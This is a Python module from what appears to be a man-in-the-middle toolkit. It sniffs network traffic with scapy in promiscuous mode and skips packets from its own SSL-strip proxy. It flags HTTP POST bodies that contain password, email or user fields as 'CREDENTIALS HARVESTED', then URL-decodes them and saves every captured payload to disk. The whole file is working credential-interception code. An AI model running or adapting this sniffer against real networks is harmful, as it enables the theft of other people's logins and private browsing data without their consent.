import scapy.all as scapy
import uuid
import time
import hashlib
import re
from . import STATUS, STOP_EVENT, CAPTURE_DIR
from .utils import log_msg, set_promiscuous_mode

# Global cache to prevent duplicate logs
recent_packets = {}

def parse_packet_data(payload):
    """
    Analyzes the payload to determine a Title, Description, and Color Type.
    """
    title = "RAW DATA"
    description = payload[:100] 
    alert_type = "INFO"

    # 1. Check for POST (Login/Register Forms) - HIGH PRIORITY (RED/ORANGE)
    if "POST " in payload:
        title = "CAPTURED DATA"
        alert_type = "ALERT" 
        
        # Check if it contains credentials
        if "password" in payload.lower() or "email" in payload.lower() or "user" in payload.lower():
            title = "CREDENTIALS HARVESTED"
        
        try:
            if '\r\n\r\n' in payload:
                headers, body = payload.split('\r\n\r\n', 1)
                if body:
                    import urllib.parse
                    description = urllib.parse.unquote(body).replace('&', '\n')
                else:
                    description = "Empty POST Body"
        except:
            description = "Form data detected"

    # 2. Check for GET (Page Loads) - NOW GREEN (INFO)
    elif payload.startswith("GET"):
        title = "PAGE REQUEST"
        alert_type = "INFO" # <--- CHANGED TO INFO (GREEN)
        
        # Extract just the URL line for cleanliness
        try:
            first_line = payload.split('\r\n')[0]
            description = first_line # e.g. "GET /dashboard.html HTTP/1.1"
        except:
            description = "Page load detected"

    # 3. Check for Server Responses (HTTP 200/300) - LOW PRIORITY (GREY)
    elif payload.startswith("HTTP/"):
        title = "SERVER RESPONSE"
        alert_type = "WARNING" # Maps to GREY
        try:
            description = payload.split('\r\n')[0]
        except:
            description = "Server status"

    return title, description, alert_type

def packet_callback(packet):
    if STOP_EVENT.is_set(): return
    
    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP):
        try:
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            # 1. Ignore own SSL Strip Proxy Traffic (Port 10000)
            if packet[scapy.TCP].sport == 10000 or packet[scapy.TCP].dport == 10000:
                return 

            # 2. Deduplication
            payload_hash = hashlib.md5(payload.encode()).hexdigest()
            current_time = time.time()
            if payload_hash in recent_packets:
                if current_time - recent_packets[payload_hash] < 2.0:
                    return 
            recent_packets[payload_hash] = current_time

            # 3. Capture Logic
            is_interesting = "POST " in payload or "GET " in payload or "HTTP/" in payload
            
            if is_interesting:
                title, desc, type_class = parse_packet_data(payload)

                timestamp_id = time.strftime('%H%M%S')
                clean_src = packet[scapy.IP].src.replace('.', '-')
                pkt_id = f"{timestamp_id}_{clean_src}"
                src = packet[scapy.IP].src
                
                # Save Raw File
                with open(f"{CAPTURE_DIR}/{pkt_id}.html", "w", encoding="utf-8") as f: f.write(payload)
                
                data_entry = {
                    "id": pkt_id, 
                    "time": time.strftime('%H:%M:%S'),
                    "src": src, 
                    "dst": packet[scapy.IP].dst,
                    "title": title,         
                    "snippet": desc,        
                    "type": type_class
                }
                
                STATUS["intercepted_data"].append(data_entry)
                STATUS["all_intercepted_data"].append(data_entry) 
                
                # Only log Alerts (Creds) to terminal
                if type_class == "ALERT":
                    log_msg(f"[{title}] from {src}")

        except: pass

def start_sniffer():
    interface = STATUS["interface"]
    set_promiscuous_mode(interface, True)
    try:
        scapy.sniff(iface=interface, store=0, prn=packet_callback, stop_filter=lambda p: STOP_EVENT.is_set())
    except Exception as e:
        log_msg(f"[!] Sniffer Error: {e}")
    finally:
        set_promiscuous_mode(interface, False)